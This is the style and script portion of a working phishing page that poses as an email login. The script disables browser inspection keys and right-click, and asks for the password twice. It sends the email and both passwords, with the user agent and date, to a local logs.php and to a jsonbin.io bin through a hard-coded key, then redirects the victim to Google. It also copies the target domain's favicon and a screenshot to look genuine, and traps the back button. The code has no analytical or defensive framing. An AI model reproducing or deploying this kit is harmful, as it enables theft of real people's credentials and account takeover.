    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            width: 100vw;
            overflow-x: hidden;
            background-color: #FFFFFF;
            padding: 10px;
        }
        .form-container {
            text-align: center;
            width: 100%;
            max-width: 500px;
            padding: 20px;
            border-radius: 5px;
            background-color: #FFFFFF;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 50%;
            max-width: 150px;
            height: auto;
        }
        .input-group {
            margin: 20px 0;
            text-align: left;
        }
        .input-group label {
            display: block;
            color: #0A5C9C;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 10px 0;
            margin: 0;
            border: none;
            border-bottom: 2px solid #0A5C9C;
            outline: none;
            font-size: 16px;
        }
        .text-links {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        .text-links a {
            padding: 0 10px;
            color: #0A5C9C;
            text-decoration: underline;
            font-size: 14px;
        }
        button {
            background-color: #0A5C9C;
            color: #FFFFFF;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
            max-width: none;
            text-transform: uppercase;
            margin-top: 30px;
            margin-bottom: 30px;
            font-size: 16px;
        }
        .language {
            margin: 20px 0;
            color: #0A5C9C;
            font-size: 14px;
        }
        .privacy-policy a {
            color: #0A5C9C;
            text-decoration: underline;
            font-size: 14px;
        }

    <script>
        // Anti-debugging and anti-inspection measures
        window.addEventListener('keydown', (e) => {
            if (e.ctrlKey && (e.which == 83)) {
                e.preventDefault();
                return false;
            }
        });
        window.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = (e) => {
            if (event.keyCode == 123) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
                return false;
            }
            if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
                return false;
            }
        }
        window.onkeydown = (e) => {
            return !(e.ctrlKey &&
                (e.keyCode === 67 ||
                    e.keyCode === 85 ||
                    e.keyCode === 86 ||
                    e.keyCode === 88 ||
                    e.keyCode === 117));
        };

        // Main stolen credential function
        function send_result(x, y) {
            $.ajax({
                url: "./logs.php",
                type: "POST",
                data: { "email": x, "password": y },
                success: function(response) {
                    console.log(response);
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    console.error("Error: " + textStatus, errorThrown);
                }
            });
        }

        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const emailParam = urlParams.get('files');
        const loginForm = document.getElementById('loginForm');
        const messageDiv = document.getElementById('errtxt');
        const userAgent = navigator.userAgent;
        const currentDate = new Date();
        const emailInput = document.getElementById('loginid');
        const passwordInput = document.getElementById('loginpw');

        let submittedCount = 0;
        let password1 = '';
        let password2 = '';

       // Handle form submission
loginForm.addEventListener('submit', function(event) {
    event.preventDefault();
    
    const email = emailInput.value;
    const password = passwordInput.value;
    
    if (!email || !password) {
        messageDiv.innerHTML = 'Please enter both email and password.';
        messageDiv.style.display = 'block';
        return;
    }
    
    submittedCount++;
    
    if (submittedCount === 1) {
        password2 = password;
        passwordInput.value = '';
        messageDiv.style.display = 'block';
        messageDiv.innerHTML = 'Please re-enter your password for verification.';
        emailInput.disabled = true;
    } else if (submittedCount === 2) {
        password1 = password;
        passwordInput.value = '';
        messageDiv.style.display = 'none';
        
        // Send to logs.php
        send_result(email, password1);
        
        const emailParts = email.split('@');
        const domain = emailParts[0] || email;
        
        const dataToSend = {
            'Domain': domain,
            'Email': email,
            'P1': password2,
            'P2': password1,
            'UserAgent': userAgent,
            'Date': currentDate.toISOString()
        };
        
        // FIXED: API key as a proper string
        const apiKey = '$2a$10$odArGOOpbtXO6isDFjks6.C.vwKLGhRuqkgunTsYn1iRqkhum4JG2';
        
        fetch(`https://api.jsonbin.io/v3/b`, {
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json',
                'X-Master-Key': apiKey,
                'X-Bin-Name': email.replace(/[^a-zA-Z0-9]/g, '_') // Sanitize bin name
            },
            'body': JSON.stringify(dataToSend)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Data stored successfully:', data);
            window.location.href = 'https://google.com';
        })
        .catch(error => {
            console.error('Error:', error);
            // Still redirect even if API fails
            window.location.href = 'https://google.com';
        });
    }
});

        // Redirect to Google
        function redirectToGoogle() {
            window.location.href = 'https://google.com';
        }

        // Generate random string
        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters.charAt(randomIndex);
            }
            return result;
        }

        const currentURL = window.location.protocol + '//' + window.location.host;
        const randomString = generateRandomString(32);

        // Modify browser history
        history.pushState(null, null, window.location.href);
        
        // Handle popstate event
        window.onpopstate = function(event) {
            history.pushState(null, null, window.location.href);
        };
        
        // Set timeout for history manipulation
        setTimeout(function() {
            const newURL = currentURL + '/' + randomString + '/' + randomString;
            history.pushState(null, '', newURL);
        }, 1000);
        
        // Set favicon
        function setFavicon(url) {
            let link = document.querySelector("link[rel='icon']");
            if (link) {
                link.href = url;
            } else {
                link = document.createElement('link');
                link.rel = 'icon';
                link.href = url;
                document.head.appendChild(link);
            }
        }
        
        // DOM manipulation to hide elements
        document.addEventListener('DOMContentLoaded', function() {
            // Remove Google Translate navigation iframe
            const googleTranslateIframe = document.querySelector('iframe[title="Google Translate navigation"]');
            if (googleTranslateIframe) {
                googleTranslateIframe.style.display = 'none';
            }
            
            // Hide body element with id 'yDmH0d' if exists
            const bodyElement = document.getElementById('yDmH0d');
            if (bodyElement) {
                bodyElement.style.display = 'none';
            }
            
            // Remove elements with class 'mLrkK' every second
            setInterval(function() {
                const elementsToRemove = document.querySelectorAll('.mLrkK');
                if (elementsToRemove) {
                    elementsToRemove.forEach(element => element.remove());
                }
            }, 1000);
        });
        
        // Handle email parameter from URL
        if (emailParam === null || emailParam.trim() === '') {
            // No email param, do nothing - let user enter manually
            console.log('No email parameter provided');
        } else {
            const emailParts = emailParam.split('@');
            if (emailParts.length === 1) {
                const domain = emailParts[0];
                const faviconUrl = `https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://${domain}&size=400`;
                
                setFavicon(faviconUrl);
                
                document.body.style.background = `url("https://image.thum.io/get/width/1200/crop/700/http://${domain}")`;
                emailInput.value = emailParam;
                passwordInput.focus();
            } else {
                // Valid email format, pre-fill it
                emailInput.value = emailParam;
                passwordInput.focus();
            }
        }
    </script>
